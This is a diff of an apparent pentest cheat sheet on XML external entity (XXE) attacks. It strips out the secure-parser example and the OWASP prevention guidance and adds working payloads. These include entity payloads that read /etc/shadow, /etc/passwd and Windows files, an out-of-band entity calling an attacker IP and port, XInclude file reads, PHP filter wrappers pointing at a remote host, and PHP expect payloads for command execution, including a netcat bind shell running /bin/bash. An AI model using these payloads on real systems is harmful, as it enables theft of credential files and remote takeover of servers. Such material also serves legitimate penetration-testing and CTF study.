@@ -1,64 +1,35 @@
-# SAXReader
-## Insecure
-```
-public class SAXReaderXMLInjectionExample() {
-    public void main(String[] args) {
-        try {
-            SAXReader reader = new SAXReader();
-            Document document = reader.read( file.getInputStream() );
-            List<Node> nodes = document.selectNodes("//employees/employee");
-        }
-    }
-}
-```
-## Secure
-```
-public class SAXReaderXMLInjectionExample() {
-    public void main(String[] args) {
-        try {
-            SAXReader reader = new SAXReader();
-            reader.setFeature( DISALLOW_DOCTYPE_DECL_FEATURE, true);
-            Document document = reader.read( file.getInputStream() );
-            List<Node> nodes = document.selectNodes("//employees/employee");
-        }
-    }
-}
-```
-## Explanation
-The safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on the parser, the method should be similar to the following:
-
-`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
-
-Disabling DTDs also makes the parser secure against denial of services (DOS) attacks such as Billion Laughs. If it is not possible to disable DTDs completely, then external entities and external document type declarations must be disabled in the way that's specific to each parser.
-
-If you are unable to disable using the above, then you must use the following two together to disable DTDs and prevent XML
-`factory.setFeature("http://xml.org/sax/features/external-general-entities", false);`
-`factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);`
-
+# XXE
 ## Exploit Example
 ### read /etc/shadow
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/shadow"> ]>
-### read /etc/passwd
-<?xml version=”1.0″ encoding=”ISO-8859-1″?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM “file:///etc/passwd” >]> <xml> <foo>&xxe;</foo> </xml>
+### read a common/less privileged linux file
+<?xml version=”1.0″ encoding=”ISO-8859-1″?> 
+<!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM “file:///etc/passwd” >
+]> 
+<xml> 
+<foo>&xxe;</foo> </xml>
 
-### /etc/shadow
+### read a privileged file
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
 <foo>&xxe;</foo>
 
-### read boot.ini in windows
+### read common file in windows
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
 <foo>&xxe;</foo>
 
-### xml with fields to grab /etc/passwd
+
+### xml with fields to grab a file
 The server is expecting certain fields in the XML file.  
 https://infosecwriteups.com/devoops-an-xml-external-entity-xxe-hackthebox-walkthrough-fb5ba03aaaa2
-```
+`
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE note [
 <!ENTITY file SYSTEM "file:////etc/passwd" >
@@ -68,13 +39,13 @@ https://infosecwriteups.com/devoops-an-xml-external-entity-xxe-hackthebox-walkth
   <Subject>Gimme the Loot</Subject>
   <Content>&file;</Content>
 </note>
-```
+`
+
 ### xml to connect to my IP and port
-```
 <?xml version = "1.0"?>
 <!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "http://$MY_IP:$MY_PORT" >
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "http://$MY_IP:$MY_PORT" >
 ]>
 <foo>&xxe;</foo>
 <order>
@@ -83,7 +54,7 @@ https://infosecwriteups.com/devoops-an-xml-external-entity-xxe-hackthebox-walkth
 <address>&file;</address>
 <note></note>
 </order>
-```
+
 ##  Server to read files
 1.  Make a file called `xxe.dtd` with the following contents
 ```
@@ -127,5 +98,48 @@ COM1:=9600,n,8,1
 └─$  
 ```
 
-## links
-OWASP XXE Prevention link: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+
+##  XInclude Attacks
+For when you cannot modify the DOCTYPE element use the XInclude to target
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+## PHP Wrappers
+### PHP filter with base64 encode to remote
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
+]>
+<foo>&xxe;</foo>
+
+### PHP filter with base64 encoded local file
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <address>42 rue du CTF</address>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+
+### PHP expect RCE
+Use `$IFS` in place of spaces
+#### ls -lahrt
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://ls$IFS-lahrt">]>
+<entry>
+  <subject>&xxe;</subject>
+  <category>Test</category>
+  <text>Test</text>
+</entry>
+
+#### netcat -nvlp $MY_PORT -e '/bin/bash'
+<!ENTITY xxe SYSTEM "expect://nc$IFS-nvlp$IFS'3334'$IFS-e$IFS'/bin/bash'">]>
+
